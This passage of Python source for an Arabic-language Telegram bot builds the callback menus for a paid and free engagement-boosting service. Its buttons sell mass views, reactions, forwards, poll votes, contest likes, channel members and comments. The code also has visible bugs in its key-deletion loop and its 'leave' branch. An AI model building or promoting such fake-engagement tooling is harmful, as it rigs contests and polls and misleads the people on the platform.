        if cid in db.get("admins") or cid == sudo:
            type = 'unban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد الغاء حظره من استخدام البوت ',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'cast':
        if cid in db.get("admins") or cid == sudo:
            x  = bot.edit_message_text(text=f'ارسل الاذاعة لتريد ترسلها... صورة، فيد، ملصق، نص، متحركة ..',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, casting)
    if data == 'lespoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تخصم النقاط منه', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, lespoints)
    if data == 'back':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        user_id = call.from_user.id
        keys = mk(row_width=3)
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/H_H6H')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')

        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn7)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        bot.edit_message_text(text=mm,chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'getinfo':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص الذي تريد معرفة معلوماته', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, get_info)
    if data == 'lvall':
        keys = mk(row_width=2)
        btn2 = btn('تاكيد المغادرة',callback_data='lvallc')
        btn3 = btn('الغاء',callback_data='cancel')
        keys.add(btn2)
        keys.add(btn3)
        bot.edit_message_text(text='هل انت متاكد من مغادرة كل القنوات والمجموعات ؟',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'ps':
        keys = mk(row_width=2)
        btn2 = btn('الخدمات المجانية',callback_data='free')
        btn3 = btn('الخدمات الـ ViP',callback_data='vips')
        keys.add(btn3)
        keys.add(btn2)
        keys.add(btn('رجوع .', callback_data='back'))
        bot.edit_message_text(text='اهلا بيك بقسم الخدمات العادية ',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'free':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn2 = btn('تصويت لايكات مسابقات',callback_data='votes')
        btn3 = btn('رشق تفاعلات اختياري',callback_data='react')
        btn5 = btn('رشق تفاعلات عشوائي',callback_data='reacts')
        btn6 = btn('رشق توجيهات علي منشور القناة',callback_data='forward')
        btn7 = btn('رشق مشاهدات ',callback_data='view')
        btn8 = btn('رشق استفتاء',callback_data='poll')
        btn9 = btn('رشق روابط دعوة بدون اشتراك اجبارى',callback_data='linkbot')
        keys.add(btn2)
        keys.add(btn3, btn5)
        keys.add(btn6)
        keys.add(btn7, btn8)
        keys.add(btn9)
        keys.add(btn('رجوع', callback_data='ps'))
        bot.edit_message_text(text='اهلا بيك بقسم الخدمات العادية ',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'vips':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        keys = mk(row_width=2)
        btn3 = btn('رشق اعضاء قناة عامة ',callback_data='members')
        btn4 = btn('رشق اعضاء قناة خاصة ',callback_data='membersp')
        btn8 = btn('رشق مستخدمين البوت',callback_data='userbot')
        btn9 = btn('رشق تعليقات',callback_data='comments')
        btn10 = btn('رشق روابط دعوة اشتراك اجبارى',callback_data='linkbot2')
        keys.add(btn3,btn4)
        keys.add(btn8)
        keys.add(btn9)
        keys.add(btn10)
        keys.add(btn('رجوع', callback_data='ps'))
        bot.edit_message_text(text='• مرحبا بك في قسم المشتركين الـ ViP , يمكن للمشتركين الـ ViP استخدام هذا القسم فقط',chat_id=cid,message_id=mid,reply_markup=keys)
    if data == 'collect':
        keys = mk(row_width=2)
        btn1 = btn('الهدية اليومية 🎁', callback_data='dailygift')
        btn3 = btn('رابط الدعوة 🌀',callback_data='share_link')
        keys.add(btn3, btn1)
        keys.add(btn('رجوع', callback_data='back'))
        bot.edit_message_text(text='• مرحبا بك في قسم تجميع النقاط \n\n• يمكنك تجميع النقاط عبر الازرار التي امامك',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'leave':
        if cid in admins:
            db.set(f'leave_{cid}_proccess', True)
            x = bot.edit_message_text(text='ارسل رابط اذا القناة خاصه، اذا عامه ارسل معرفها فقط؟',reply_markup=bk,chat_id=cid,message_id=mid)
        type = 'leavs'
        bot.register_next_step_handler(x, get_amount, type)
    if data == 'account':
        if not check_user(cid):
            return start_message(call.message)
        acc = get(cid)
        user_id = call.from_user.id
        coins, users = acc['coins'], len(get(cid)['users'])
        info = db.get(f"user_{call.from_user.id}")
        daily_count = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
        daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
        all_gift = daily_count * daily_gift
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        trans = int(db.get(f"user_{user_id}_trans")) if db.exists(f"user_{user_id}_trans") else 0
        y = trend()
        prem = 'Premium' if info['premium'] == True else 'Free'
        textt = f'''
• [❇️] عدد نقاط حسابك : {coins}
• [🌀] عدد عمليات الاحاله التي قمت بها : {users}
• [👤] نوع اشتراكك داخل البوت : {prem}
• [🎁] عدد الهدايا اليومية التي جمعتها : {daily_count}
• [❇️] عدد النقاط اللي جمعتها من الهدايا اليومية : {all_gift}
• [📮] عدد الطلبات التي طلبتها : {buys}
• [♻️] عدد التحويلات التي قمت بها : {trans}

{y}'''
        bot.edit_message_text(text=textt,chat_id=cid,message_id=mid,reply_markup=bk)
   
